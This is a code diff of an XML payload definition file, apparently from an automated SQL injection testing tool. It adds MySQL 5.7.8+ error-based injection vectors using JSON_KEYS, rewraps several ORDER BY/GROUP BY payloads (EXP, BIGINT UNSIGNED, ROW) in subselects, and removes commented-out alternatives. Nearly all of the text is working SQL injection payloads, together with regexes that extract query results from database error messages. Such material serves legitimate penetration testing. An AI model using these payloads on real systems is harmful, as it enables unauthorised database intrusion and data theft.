@@ -190,6 +190,47 @@
     </test>
 
     <test>
+        <title>MySQL &gt;= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)</title>
+        <stype>2</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')) USING utf8)))</vector>
+        <request>
+            <payload>AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]')) USING utf8)))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.7.8</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <!-- It does not work against ORDER BY or GROUP BY clause -->
+        <title>MySQL &gt;= 5.7.8 OR error-based - WHERE, HAVING clause (JSON_KEYS)</title>
+        <stype>2</stype>
+        <level>5</level>
+        <risk>3</risk>
+        <clause>1,9</clause>
+        <where>1</where>
+        <vector>OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')) USING utf8)))</vector>
+        <request>
+            <payload>OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]')) USING utf8)))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.7.8</dbms_version>
+        </details>
+    </test>
+
+    <test>
         <title>MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)</title>
         <stype>2</stype>
         <level>4</level>
@@ -785,6 +826,26 @@
     </test>
 
     <test>
+        <title>MySQL &gt;= 5.7.8 error-based - Parameter replace (JSON_KEYS)</title>
+        <stype>2</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>1,2,3,9</clause>
+        <where>3</where>
+        <vector>JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')) USING utf8)))</vector>
+        <request>
+            <payload>JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]')) USING utf8)))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.7.8</dbms_version>
+        </details>
+    </test>
+
+    <test>
         <title>MySQL &gt;= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)</title>
         <stype>2</stype>
         <level>5</level>
@@ -937,10 +998,6 @@
         <where>1</where>
         <vector>,(SELECT 1 FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)</vector>
         <request>
-            <!-- These work as good as ELT(), but are longer
-            <payload>,(SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)</payload>
-            <payload>,(SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (MAKE_SET([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)</payload>
-            -->
             <payload>,(SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)</payload>
         </request>
         <response>
@@ -961,10 +1018,6 @@
         <where>1</where>
         <vector>,EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'))</vector>
         <request>
-            <!-- These work as good as ELT(), but are longer
-            <payload>,EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]'))</payload>
-            <payload>,EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT (MAKE_SET([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'))</payload>
-            -->
             <payload>,EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'))</payload>
         </request>
         <response>
@@ -985,10 +1038,6 @@
         <where>1</where>
         <vector>,UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM1])</vector>
         <request>
-            <!-- These work as good as ELT(), but are longer
-            <payload>,UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]'),[RANDNUM1])</payload>
-            <payload>,UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT (MAKE_SET([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM1])</payload>
-            -->
             <payload>,UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM1])</payload>
         </request>
         <response>
@@ -1007,9 +1056,9 @@
         <risk>1</risk>
         <clause>2,3</clause>
         <where>1</where>
-        <vector>,EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))x))</vector>
+        <vector>,(SELECT [RANDNUM] FROM (SELECT EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))x)))s)</vector>
         <request>
-            <payload>,EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))x))</payload>
+            <payload>,(SELECT [RANDNUM] FROM (SELECT EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))x)))s)</payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -1021,19 +1070,35 @@
     </test>
 
     <test>
+        <title>MySQL &gt;= 5.7.8 error-based - ORDER BY, GROUP BY clause (JSON_KEYS)</title>
+        <stype>2</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <vector>,(SELECT [RANDNUM] FROM (SELECT JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')) USING utf8))))x)</vector>
+        <request>
+            <payload>,(SELECT [RANDNUM] FROM (SELECT JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]')) USING utf8))))x)</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.7.8</dbms_version>
+        </details>
+    </test>
+
+    <test>
         <title>MySQL &gt;= 5.5 error-based - ORDER BY, GROUP BY clause (BIGINT UNSIGNED)</title>
         <stype>2</stype>
         <level>5</level>
         <risk>1</risk>
         <clause>2,3</clause>
         <where>1</where>
-        <vector>,(SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))</vector>
+        <vector>,(SELECT [RANDNUM] FROM (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))x)</vector>
         <request>
-            <!-- These work as good as ELT(), but are longer
-            <payload>,(SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))</payload>
-            <payload>,(SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (MAKE_SET([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))</payload>
-            -->
-            <payload>,(SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))</payload>
+            <payload>,(SELECT [RANDNUM] FROM (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))x)</payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -1051,13 +1116,9 @@
         <risk>1</risk>
         <clause>2,3</clause>
         <where>1</where>
-        <vector>,ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)</vector>
+        <vector>,(SELECT [RANDNUM] FROM (SELECT ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x))s)</vector>
         <request>
-            <!-- These work as good as ELT(), but are longer
-            <payload>,ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)</payload>
-            <payload>,ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (MAKE_SET([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)</payload>
-            -->
-            <payload>,ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)</payload>
+            <payload>,(SELECT [RANDNUM] FROM (SELECT ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x))s)</payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
